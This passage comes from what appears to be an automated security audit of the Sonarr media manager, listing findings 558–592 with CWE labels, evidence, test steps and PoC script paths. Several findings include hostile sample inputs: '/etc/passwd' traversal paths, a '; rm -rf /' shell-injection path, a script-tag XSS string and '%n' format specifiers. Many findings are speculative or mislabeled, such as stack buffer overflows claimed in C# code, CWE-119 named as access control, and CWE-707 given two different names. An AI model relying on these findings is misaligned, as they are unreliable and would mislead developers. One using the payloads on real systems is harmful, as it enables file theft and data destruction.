**Evidence:**
```
The Reorder method accepts 'int? afterId' but doesn't validate if the ID exists in the database before using it. The code uses SingleOrDefault without checking if the result is null.
```

**Impact:**
Invalid afterId values could cause null reference exceptions or incorrect ordering of delay profiles, potentially leading to data inconsistency.

**Proof of Concept:**
Call Reorder with a non-existent afterId value (e.g., 999999) which would cause the method to proceed with a null 'after' variable, potentially leading to incorrect ordering logic.

**How to Test:**
1. Call Reorder method with a non-existent delay profile ID
2. Verify if null reference exceptions occur
3. Check if the ordering logic behaves correctly with invalid IDs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Profiles_Delay_DelayProfileServicecs.py`
---

### 559. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/MediaFiles/DiskScanService.cs
**Line:** 134

**Description:**
The disk scanning functionality may be vulnerable to path traversal attacks when processing file paths.

**Evidence:**
```
The FilterPaths method processes file paths and uses Path.GetRelativePath which could be manipulated with ../ sequences. The code processes paths from disk scans without sufficient validation.
```

**Impact:**
An attacker could potentially access files outside of the intended scan directories by manipulating file paths during scanning.

**Proof of Concept:**
Create a file with path traversal sequences like '../etc/passwd' in a series folder and verify if the scanning process can access files outside the series directory.

**How to Test:**
1. Create a test series folder with files containing path traversal sequences
2. Run a scan on that series
3. Verify if files outside the series directory are processed
4. Check for access to system files

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_MediaFiles_DiskScanServicecs.py`
---

### 560. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Profiles/Delay/DelayProfileService.cs
**Line:** 40

**Description:**
The Delete method uses array indexing without proper bounds checking when reordering delay profiles.

**Evidence:**
```
The code uses 'all[i].Id == 1' to skip the first item but doesn't validate that 'i' is within bounds when accessing 'all[i]' in the loop.
```

**Impact:**
Array index out of bounds exception could occur if the database state is inconsistent or if there are race conditions during deletion.

**Proof of Concept:**
Delete a delay profile while another process is modifying the same profiles, potentially causing array index out of bounds during reordering.

**How to Test:**
1. Simultaneously delete and modify delay profiles
2. Monitor for array index out of bounds exceptions
3. Check database consistency during concurrent operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Profiles_Delay_DelayProfileServicecs.py`
---

### 561. Cross-Site Request Forgery (CWE-352)

**File:** src/NzbDrone.Core/Jobs/TaskManager.cs
**Line:** 100

**Description:**
The task management system lacks CSRF protection for scheduled task operations.

**Evidence:**
```
The TaskManager handles scheduled tasks but doesn't implement CSRF tokens for task modification operations. The code directly processes task updates without validating request authenticity.
```

**Impact:**
An attacker could perform unauthorized task modifications or trigger unwanted scheduled operations through CSRF attacks.

**Proof of Concept:**
Create a malicious web page that submits task modification requests to the Sonarr API without proper authentication tokens, potentially changing task intervals or disabling critical tasks.

**How to Test:**
1. Monitor API endpoints for task management operations
2. Try submitting task modification requests without proper authentication
3. Verify if CSRF tokens are implemented for task operations
4. Test if unauthorized task changes are accepted

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Jobs_TaskManagercs.py`
---

### 562. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/MediaFiles/DiskScanService.cs
**Line:** 134

**Description:**
Log messages may not be properly neutralized, potentially leading to log injection or command execution in log processing.

**Evidence:**
```
The code uses string interpolation in log messages without proper sanitization of user-provided data, particularly in file paths and series titles.
```

**Impact:**
Log injection could allow attackers to manipulate log entries or potentially execute commands if logs are processed by external tools.

**Proof of Concept:**
Create a series with a title containing log injection characters and verify if the log entries can be manipulated or if external log processors are affected.

**How to Test:**
1. Create series with titles containing log injection characters
2. Run disk scans
3. Check log output for injection vulnerabilities
4. Test if external log processors are affected

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_MediaFiles_DiskScanServicecs.py`
---

### 563. Improper Neutralization of Special Elements used in OS Command (CWE-78)

**File:** src/NzbDrone.Core/MediaFiles/RecycleBinProvider.cs
**Line:** 100

**Description:**
The code uses file paths in operations that could be vulnerable to command injection if paths contain special shell characters, particularly in the file transfer operations.

**Evidence:**
```
The DeleteFile method uses paths in file operations that could be vulnerable to shell injection if paths contain special characters, though the code uses IDiskTransferService which may abstract this.
```

**Impact:**
If the underlying disk transfer service or file operations are not properly sanitized, attackers could inject OS commands through specially crafted file paths.

**Proof of Concept:**
If a file path contains characters like ';', '&', '|', or other shell metacharacters, and the underlying implementation doesn't properly escape these, command injection could occur.

**How to Test:**
1. Create a file with a path containing shell metacharacters
2. Attempt to delete this file through the recycle bin
3. Monitor if any shell commands are executed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-78_src_NzbDroneCore_MediaFiles_RecycleBinProvidercs.py`
---

### 564. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/MediaFiles/DownloadedEpisodesImportService.cs
**Line:** 210

**Description:**
The code doesn't validate the user-provided path parameter in ProcessPath method, which could lead to various path-related issues including path traversal.

**Evidence:**
```
The ProcessPath method accepts a path parameter directly without validating its contents or ensuring it's within expected boundaries.
```

**Impact:**
Improper path validation could lead to path traversal, directory traversal, or access to unauthorized files and directories.

**Proof of Concept:**
Passing a path like '/../../../../etc/passwd' to ProcessPath could allow access to system files outside the intended scope.

**How to Test:**
1. Call ProcessPath with various malicious paths
2. Verify if the system allows access to files outside intended directories
3. Check for path traversal vulnerabilities in file operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_MediaFiles_DownloadedEpisodesImportServicecs.py`
---

### 565. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/MediaFiles/MediaFileTableCleanupService.cs
**Line:** 40

**Description:**
The code iterates through seriesFiles without proper validation of array bounds, potentially leading to index out of bounds exceptions or data corruption.

**Evidence:**
```
The foreach loop iterates through seriesFiles without checking if the collection is empty or properly validated before accessing elements.
```

**Impact:**
Array index validation issues could lead to crashes, data corruption, or potentially exploitable memory access violations.

**Proof of Concept:**
If seriesFiles collection is manipulated to contain invalid data or is accessed with incorrect indices, the cleanup process could fail or corrupt data.

**How to Test:**
1. Create a scenario with malformed seriesFiles collection
2. Run the Clean method
3. Monitor for exceptions or data corruption

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_MediaFiles_MediaFileTableCleanupServicecs.py`
---

### 566. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/MediaFiles/MediaFileDeletionService.cs
**Line:** 100

**Description:**
The MediaFileDeletionService handles file deletion operations but doesn't appear to implement CSRF protection mechanisms, making it vulnerable to CSRF attacks.

**Evidence:**
```
The DeleteEpisodeFile method is exposed as a public API endpoint without CSRF token validation, and the service is used in web contexts.
```

**Impact:**
An attacker could trick a user into deleting files by crafting malicious requests that would be executed in the context of an authenticated user.

**Proof of Concept:**
An attacker could create a malicious webpage that, when visited by an authenticated user, automatically sends a request to delete a specific episode file.

**How to Test:**
1. Access the MediaFileDeletionService API endpoints
2. Verify if CSRF tokens are required for deletion operations
3. Try to perform deletion operations without proper authentication tokens

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_MediaFiles_MediaFileDeletionServicecs.py`
---

### 567. Cross-Site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/MediaFiles/MediaFileDeletionService.cs
**Line:** 25

**Description:**
The code logs messages that include user-provided data without proper HTML escaping, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The code uses string interpolation with user-provided data in log messages (e.g., _logger.Warn("Series' root folder ({0}) doesn't exist.", rootFolder)), which could contain malicious content.
```

**Impact:**
If these log messages are displayed in web interfaces without proper HTML escaping, attackers could inject malicious scripts.

**Proof of Concept:**
If rootFolder contains '<script>alert("XSS")</script>', and this message is displayed in a web interface without escaping, the script would execute.

**How to Test:**
1. Set up logging to display in web interface
2. Trigger a log message with malicious content
3. Verify if the content is properly escaped in the web display

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_MediaFiles_MediaFileDeletionServicecs.py`
---

### 568. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/MediaFiles/MediaInfo/VideoFileInfoReader.cs
**Line:** 100

**Description:**
The code uses FFProbe to analyze media files but doesn't validate the size or content of the analysis results, potentially leading to buffer overflows.

**Evidence:**
```
The code processes FFProbe output data without validating the size or structure of the returned data, which could lead to buffer overflows when handling large or malformed media files.
```

**Impact:**
Buffer overflows in media file analysis could lead to crashes, memory corruption, or potentially remote code execution.

**Proof of Concept:**
If a specially crafted media file causes FFProbe to return malformed or oversized data structures, the parsing code could overflow buffers.

**How to Test:**
1. Create a malformed media file with oversized metadata
2. Process it through VideoFileInfoReader
3. Monitor for buffer overflow conditions or crashes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_MediaFiles_MediaInfo_VideoFileInfoReadercs.py`
---

### 569. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/MediaFiles/MediaFileDeletionService.cs
**Line:** 100

**Description:**
The service handles file deletion operations but doesn't appear to validate authentication or authorization for these operations, potentially allowing unauthorized deletions.

**Evidence:**
```
The DeleteEpisodeFile method doesn't validate if the caller has proper authorization to delete the specified episode file.
```

**Impact:**
Unauthorized users could delete episode files, potentially leading to data loss or disruption of the media library.

**Proof of Concept:**
An authenticated user could call DeleteEpisodeFile with parameters for files they don't own, potentially deleting files from other users or series.

**How to Test:**
1. Call DeleteEpisodeFile with different user credentials
2. Verify if authorization checks are performed
3. Test if unauthorized deletions are allowed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_MediaFiles_MediaFileDeletionServicecs.py`
---

### 570. Improper Control of Dynamically-Loaded Code (CWE-913)

**File:** src/NzbDrone.Core/MediaFiles/MediaInfo/VideoFileInfoReader.cs
**Line:** 100

**Description:**
The code uses FFmpeg libraries for media analysis but doesn't validate or sanitize the input data from these external libraries, potentially leading to code injection or manipulation.

**Evidence:**
```
The code relies on FFmpeg's FFProbe to analyze media files and directly uses the output data without validation or sanitization.
```

**Impact:**
Malformed media files could cause unexpected behavior or manipulation of the application through FFmpeg's output data.

**Proof of Concept:**
A specially crafted media file could cause FFProbe to return unexpected data structures that the application doesn't properly handle.

**How to Test:**
1. Process media files with unexpected or malformed metadata
2. Verify if the application handles malformed FFProbe output gracefully
3. Check for potential code manipulation through FFmpeg output

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-913_src_NzbDroneCore_MediaFiles_MediaInfo_VideoFileInfoReadercs.py`
---

### 571. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/MediaFiles/MediaFileDeletionService.cs
**Line:** 25

**Description:**
The code uses string formatting with user-provided data in log messages, potentially leading to format string vulnerabilities.

**Evidence:**
```
The code uses string interpolation with user-provided data in log messages (e.g., _logger.Warn("Series' root folder ({0}) doesn't exist.", rootFolder)), which could contain format specifiers.
```

**Impact:**
If log messages contain format specifiers, attackers could manipulate the logging output or potentially cause format string vulnerabilities.

**Proof of Concept:**
If rootFolder contains format specifiers like '%n' or '%x', these could be interpreted by the logging system and cause unexpected behavior.

**How to Test:**
1. Set up logging with format string inputs
2. Pass strings containing format specifiers to logging functions
3. Verify if format string vulnerabilities are present

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_MediaFiles_MediaFileDeletionServicecs.py`
---

### 572. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/DetectSample.cs
**Line:** 60

**Description:**
The IsSample method does not validate the input path parameter before using it in Path.GetExtension() and other file operations, potentially leading to path traversal or file access issues.

**Evidence:**
```
The method accepts a string path parameter but doesn't validate it before using Path.GetExtension(path) and other file operations.
```

**Impact:**
An attacker could potentially manipulate file paths to access unauthorized files or directories, leading to information disclosure or arbitrary file operations.

**Proof of Concept:**
If an attacker can control the path parameter in IsSample() method, they could pass a path like '../../../../etc/passwd' which might be processed by Path.GetExtension() and other file operations without proper validation.

**How to Test:**
Test by passing malicious paths to IsSample() method and observe if file operations succeed with unexpected paths or if path traversal vulnerabilities occur.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_MediaFiles_EpisodeImport_DetectSamplecs.py`
---

### 573. Improper Neutralization of Input During Shell Command Execution (CWE-707)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/DetectSample.cs
**Line:** 30

**Description:**
The code uses _videoFileInfoReader.GetRunTime(path) which likely executes external commands (ffprobe) with the path parameter, but there's no explicit validation or sanitization of the path before command execution.

**Evidence:**
```
Uses _videoFileInfoReader.GetRunTime(path) without validating or sanitizing the path parameter before passing it to external tools.
```

**Impact:**
Command injection vulnerability if ffprobe is executed with untrusted input, allowing attackers to execute arbitrary commands on the system.

**Proof of Concept:**
If path parameter contains shell metacharacters like '; rm -rf /' and ffprobe is executed with shell command construction, an attacker could execute arbitrary commands.

**How to Test:**
Test by passing paths with shell metacharacters to IsSample() method and observe if external commands execute with unexpected parameters.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_MediaFiles_EpisodeImport_DetectSamplecs.py`
---

### 574. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/DetectSample.cs
**Line:** 30

**Description:**
The code uses file paths directly without proper validation against allowed directories, potentially allowing path traversal attacks when accessing media files.

**Evidence:**
```
Direct usage of path parameter in file operations without validation against allowed directories or path sanitization.
```

**Impact:**
Attackers could access files outside of expected directories by manipulating path parameters, leading to information disclosure or unauthorized file access.

**Proof of Concept:**
Pass a path like '../../../../etc/passwd' to IsSample() method and verify if the system can access files outside of expected media directories.

**How to Test:**
Test with path traversal sequences like '../', '../../' etc. in path parameters and verify file access behavior.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_MediaFiles_EpisodeImport_DetectSamplecs.py`
---

### 575. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/DetectSample.cs
**Line:** 45

**Description:**
The code uses foreach loop to iterate through episodes but doesn't validate that the episodes collection is properly initialized or contains valid data before processing.

**Evidence:**
```
Uses foreach (var episode in localEpisode.Episodes) without validating that episodes collection is not null or empty.
```

**Impact:**
Potential null reference exceptions or incorrect processing if episodes collection is not properly initialized.

**Proof of Concept:**
Pass a LocalEpisode with null or empty Episodes collection to IsSample() method and observe if processing fails or behaves unexpectedly.

**How to Test:**
Test with LocalEpisode objects that have null or empty Episodes collections and verify error handling behavior.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_MediaFiles_EpisodeImport_DetectSamplecs.py`
---

### 576. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Aggregation/Aggregators/AggregateReleaseHash.cs
**Line:** 15

**Description:**
The release hash is stored in cleartext in the LocalEpisode object without any encryption or obfuscation, potentially exposing sensitive release information.

**Evidence:**
```
ReleaseHash is stored directly in localEpisode.ReleaseHash without any encryption or obfuscation.
```

**Impact:**
Sensitive release information could be exposed through logs, database storage, or memory dumps, potentially revealing release patterns or metadata.

**Proof of Concept:**
Monitor memory or logs to see if ReleaseHash values are stored in cleartext and could be extracted by unauthorized users.

**How to Test:**
Check database storage or logs for cleartext release hash values and verify if they contain sensitive information.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_MediaFiles_EpisodeImport_Aggregation_Aggregators_AggregateReleaseHashcs.py`
---

### 577. Allocation of Resources Without Limits or Throttling (CWE-770)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Aggregation/Aggregators/AggregateEpisodes.cs
**Line:** 60

**Description:**
The code processes episodes without any resource limits or throttling, potentially leading to resource exhaustion during processing of large episode collections.

**Evidence:**
```
Uses foreach loops to process episodes without any resource limits or throttling mechanisms.
```

**Impact:**
Resource exhaustion attacks could occur if large numbers of episodes are processed, leading to denial of service or performance degradation.

**Proof of Concept:**
Process a LocalEpisode with thousands of episodes and observe if system resources are consumed excessively.

**How to Test:**
Test with LocalEpisode objects containing large numbers of episodes and monitor resource consumption.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_NzbDroneCore_MediaFiles_EpisodeImport_Aggregation_Aggregators_AggregateEpisodescs.py`
---

### 578. Improper Access Control (CWE-284)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Aggregation/Aggregators/AggregateSubtitleInfo.cs
**Line:** 25

**Description:**
The code doesn't validate access control when processing subtitle files, potentially allowing unauthorized access to subtitle information.

**Evidence:**
```
Subtitle processing logic doesn't include access control validation before processing subtitle files.
```

**Impact:**
Unauthorized access to subtitle information or processing of unauthorized subtitle files could occur.

**Proof of Concept:**
Attempt to process subtitle files with different access permissions and verify if access control is properly enforced.

**How to Test:**
Test subtitle file processing with different user permissions and verify access control enforcement.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_NzbDroneCore_MediaFiles_EpisodeImport_Aggregation_Aggregators_AggregateSubtitleInfocs.py`
---

### 579. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/DetectSample.cs
**Line:** 35

**Description:**
The code uses string formatting with logger messages that could be influenced by external input, potentially leading to format string vulnerabilities.

**Evidence:**
```
Uses _logger.Error() and _logger.Debug() with format strings that could contain external input.
```

**Impact:**
Format string vulnerabilities could occur if external input is used in logger messages, potentially leading to information disclosure or code execution.

**Proof of Concept:**
Pass format strings with external input to logger methods and observe if format string vulnerabilities occur.

**How to Test:**
Test logger methods with external input format strings and verify if format string vulnerabilities are present.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_MediaFiles_EpisodeImport_DetectSamplecs.py`
---

### 580. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 220

**Description:**
The ProcessFile method uses reflection and dynamic object creation that could be vulnerable to code injection if input data is not properly validated.

**Evidence:**
```
The method uses Parser.Parser.ParsePath() and other parsing methods that could be influenced by user input, and the code constructs LocalEpisode objects dynamically.
```

**Impact:**
If user input is not properly validated, it could lead to injection of malicious code during parsing or object construction.

**Proof of Concept:**
Provide specially crafted file paths or metadata that could cause the parser to construct malicious objects or execute unexpected code during import processing.

**How to Test:**
Test with specially crafted file names or metadata that could cause unexpected behavior in the parsing or object construction process.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 581. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 380

**Description:**
The ManualImportService exposes methods that can be called through API endpoints but lacks CSRF protection mechanisms.

**Evidence:**
```
The service implements IExecute<ManualImportCommand> and handles commands, but there's no explicit CSRF token validation in the command processing.
```

**Impact:**
An attacker could trick a user into executing unauthorized import operations by crafting malicious requests that would be processed by the service.

**Proof of Concept:**
An attacker could create a malicious web page that automatically submits a ManualImportCommand to the system, causing unauthorized imports without user consent.

**How to Test:**
Verify that API endpoints accepting ManualImportCommand do not validate CSRF tokens and test if commands can be submitted from external domains.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 582. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 120

**Description:**
The GetMediaFiles method accepts downloadId parameter that is not properly validated, potentially leading to injection or unexpected behavior.

**Evidence:**
```
The method accepts downloadId parameter and passes it directly to _trackedDownloadService.Find(downloadId) without validation.
```

**Impact:**
Improper validation of downloadId could lead to injection vulnerabilities or unexpected behavior when processing tracked downloads.

**Proof of Concept:**
Pass a malformed downloadId parameter that could cause the tracked download service to behave unexpectedly or throw exceptions.

**How to Test:**
Test with various malformed downloadId values including empty strings, very long strings, and special characters to verify validation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 583. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 170

**Description:**
The ReprocessItem method accepts multiple user-provided parameters that are not properly validated before use.

**Evidence:**
```
Method accepts episodeIds, releaseGroup, quality, languages, indexerFlags, and releaseType parameters without validation.
```

**Impact:**
Unvalidated parameters could lead to unexpected behavior, injection vulnerabilities, or incorrect processing of import decisions.

**Proof of Concept:**
Pass invalid episodeIds (like negative numbers or very large values), malformed releaseGroup strings, or invalid quality values to trigger unexpected behavior.

**How to Test:**
Test ReprocessItem with various invalid parameter combinations to verify proper validation and error handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 584. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 178

**Description:**
The ReprocessItem method accesses episodeIds array without proper bounds checking, potentially leading to array index out of bounds exceptions.

**Evidence:**
```
The method uses episodeIds.Any() and then accesses episodeIds directly without validating array bounds.
```

**Impact:**
Array index out of bounds could cause application crashes or potentially allow exploitation of memory corruption vulnerabilities.

**Proof of Concept:**
Pass an episodeIds array with invalid indices or manipulate the array structure to cause out-of-bounds access during processing.

**How to Test:**
Test with episodeIds arrays that have invalid indices or test edge cases where array bounds are exceeded.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 585. Improper Control of a Resource Through Time (CWE-707)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 380

**Description:**
The Execute method in ManualImportService processes multiple files in a loop without proper resource management, potentially leading to resource leaks.

**Evidence:**
```
The method processes files in a for loop without explicit resource cleanup or proper disposal of objects.
```

**Impact:**
Resource leaks could accumulate over time, leading to performance degradation or potential denial of service conditions.

**Proof of Concept:**
Execute a large batch import operation and monitor resource usage to verify if resources are properly cleaned up.

**How to Test:**
Run large import operations and monitor memory usage, file handles, and other resources to detect potential leaks.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 586. Improper Access Control (CWE-119)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/Manual/ManualImportService.cs
**Line:** 380

**Description:**
The Execute method accesses series and episode data without proper access control validation, potentially allowing unauthorized access to data.

**Evidence:**
```
The method directly accesses _seriesService.GetSeries(file.SeriesId) and _episodeService.GetEpisodes(file.EpisodeIds) without checking permissions.
```

**Impact:**
Unauthorized users could potentially access series or episode data they shouldn't have access to, leading to information disclosure.

**Proof of Concept:**
Call Execute with file.SeriesId pointing to a series the user doesn't have access to, and verify if the system allows processing of that series.

**How to Test:**
Test Execute method with series IDs that should be restricted to certain users and verify access control enforcement.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-119_src_NzbDroneCore_MediaFiles_EpisodeImport_Manual_ManualImportServicecs.py`
---

### 587. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Messaging/Commands/CommandExecutor.cs
**Line:** 35

**Description:**
The command execution process does not validate command input parameters, potentially allowing malformed or malicious command data to be processed.

**Evidence:**
```
The ExecuteCommands method processes commands from a queue without validating the structure or content of command bodies before passing them to ExecuteCommand.
```

**Impact:**
Malformed command data could cause unexpected behavior, crashes, or allow privilege escalation through command manipulation.

**Proof of Concept:**
Submit a command with malformed body data to the command queue and observe if it causes exceptions or unexpected behavior in the command execution pipeline.

**How to Test:**
1. Submit commands with malformed or unexpected body structures
2. Monitor for exceptions or unexpected behavior
3. Test with various command types and data formats

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Messaging_Commands_CommandExecutorcs.py`
---

### 588. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Authentication/UserService.cs
**Line:** 50

**Description:**
The authentication system stores user passwords in a way that could expose sensitive information, particularly during migration from older password storage methods.

**Evidence:**
```
The FindUser method handles legacy SHA256 password hashes and updates them to salted PBKDF2 hashes, but there's potential for cleartext exposure during the transition period.
```

**Impact:**
If the migration process is not properly secured, legacy password hashes could be exposed, and during transition periods, passwords might be temporarily stored in cleartext.

**Proof of Concept:**
During application startup, if a config file contains cleartext passwords and the migration process is not properly secured, these passwords could be exposed.

**How to Test:**
1. Check config file contents for cleartext passwords
2. Monitor during application startup for password migration processes
3. Verify that legacy password handling doesn't expose cleartext credentials

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Authentication_UserServicecs.py`
---

### 589. Missing Release of Resource after Effective Lifetime (CWE-772)

**File:** src/NzbDrone.Core/Messaging/Commands/CommandExecutor.cs
**Line:** 100

**Description:**
The command execution process creates and manages command models but may not properly release resources in all error conditions, particularly in the finally block.

**Evidence:**
```
The ExecuteCommand method has a finally block that handles cleanup but may not properly handle all resource release scenarios, especially when exceptions occur during cleanup.
```

**Impact:**
Resource leaks could occur during command execution, potentially leading to memory exhaustion or file handle exhaustion over time.

**Proof of Concept:**
Repeatedly execute commands that fail during cleanup and monitor for resource leaks in the command execution pipeline.

**How to Test:**
1. Execute multiple commands with various failure scenarios
2. Monitor memory usage and resource consumption
3. Check for proper cleanup in finally blocks

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-772_src_NzbDroneCore_Messaging_Commands_CommandExecutorcs.py`
---

### 590. Improper Access Control (CWE-284)

**File:** src/NzbDrone.Core/Messaging/Events/EventAggregator.cs
**Line:** 70

**Description:**
The event aggregator handles event publishing but may not properly validate or control access to event handlers, potentially allowing unauthorized event processing.

**Evidence:**
```
The PublishEvent method dynamically resolves event handlers from the service factory without explicit access control validation, potentially allowing injection of unauthorized handlers.
```

**Impact:**
Unauthorized event handlers could be executed, potentially leading to privilege escalation or unauthorized code execution.

**Proof of Concept:**
Create a custom event handler that implements IHandle<TEvent> and inject it into the service factory to see if it gets executed during event publishing.

**How to Test:**
1. Try to inject custom event handlers into the service factory
2. Publish events and verify if custom handlers are executed
3. Check access control mechanisms for event handler resolution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_NzbDroneCore_Messaging_Events_EventAggregatorcs.py`
---

### 591. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Messaging/Events/EventAggregator.cs
**Line:** 100

**Description:**
The event aggregator uses dynamic handler resolution which could lead to buffer overflow conditions when handling large numbers of event handlers.

**Evidence:**
```
The EventSubscribers class uses arrays to store handlers, and the PublishEvent method processes these handlers in a loop without bounds checking for large handler collections.
```

**Impact:**
Large numbers of event handlers could cause stack overflow or memory corruption during event processing.

**Proof of Concept:**
Create an event system with a large number of handlers and trigger events to see if buffer overflow conditions occur.

**How to Test:**
1. Create event systems with large numbers of handlers
2. Trigger events and monitor for stack overflow or memory issues
3. Test with varying numbers of handlers to identify overflow thresholds

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Messaging_Events_EventAggregatorcs.py`
---

### 592. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Authentication/UserService.cs
**Line:** 100

**Description:**
The authentication system lacks CSRF protection for user management operations, potentially allowing unauthorized authentication changes.

**Evidence:**
```
The UserService handles user authentication but doesn't appear to implement CSRF tokens for authentication operations, relying only on username/password validation.
```

**Impact:**
An attacker could perform unauthorized authentication changes or user management operations through CSRF attacks.

**Proof of Concept:**
Create a malicious page that submits authentication requests to the Sonarr instance and verify if authentication changes are accepted without CSRF validation.

**How to Test:**
1. Test authentication endpoints for CSRF token requirements
2. Create CSRF attack scenarios
3. Verify authentication operations are protected against CSRF

